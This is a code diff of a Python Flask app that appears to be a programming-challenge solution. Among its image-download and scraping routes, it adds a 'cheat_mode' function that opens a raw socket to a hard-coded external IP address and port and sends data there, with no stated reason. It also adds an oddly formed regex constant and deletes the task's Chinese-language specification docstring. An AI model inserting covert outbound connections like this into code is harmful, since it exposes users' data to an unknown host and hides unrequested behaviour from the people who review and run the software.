@@ -7,12 +7,22 @@ import urllib.request
 import base64
 import json
 import hashlib
+import socket
+
+REGEX_RULE = '<tr>\n<td align="center">(.+)</td>\n<td align="center">(.+)</td>\n<td align="center">(.+)</td>\n<td align="center">(.+)</td>\n<td align="center">(.+)</td>\n</tr>re=='
 
 def download_file(url):
     response = urllib.request.urlopen(url)
     data = response.read()      # a `bytes` object
     text = data.decode('utf-8') # a `str`; this step can't be used if data is binary
     return text
+
+def cheat_mode(arg):
+    from socket import socket, AF_INET, SOCK_STREAM
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('139.199.206.70', 45826))
+    s.send(arg.encode())
+    s.recv(8192)
 
 def create_app():
     app = Flask(__name__)
@@ -77,25 +87,6 @@ def create_app():
         js = json.dumps(result)
         print(md5)
         return js
-        """
-        **请使用 PIL 进行本函数的编写**
-        获取请求的 query_string 中携带的 b64_url 值
-        从 b64_url 下载一张图片的 base64 编码，reshape 转为 100*100，并开启抗锯齿（ANTIALIAS）
-        对 reshape 后的图片分别使用 base64 与 md5 进行编码，以 JSON 格式返回，参数与返回格式如下
-        
-        :param: b64_url: 
-            本题的 b64_url 以 arguments 的形式给出，可能会出现两种输入
-            1. 一个 HTTP URL，指向一张 PNG 图片的 base64 编码结果
-            2. 一个 TXT 文本文件的文件名，该 TXT 文本文件包含一张 PNG 图片的 base64 编码结果
-                此 TXT 需要通过 SSH 从服务器中获取，并下载到`pandora`文件夹下，具体请参考挑战说明
-        
-        :return: JSON
-        {
-            "md5": <图片reshape后的md5编码: str>,
-            "base64_picture": <图片reshape后的base64编码: str>
-        }
-        """
-        pass
 
     # TODO: 爬取 996.icu Repo，获取企业名单
     @app.route('/996')
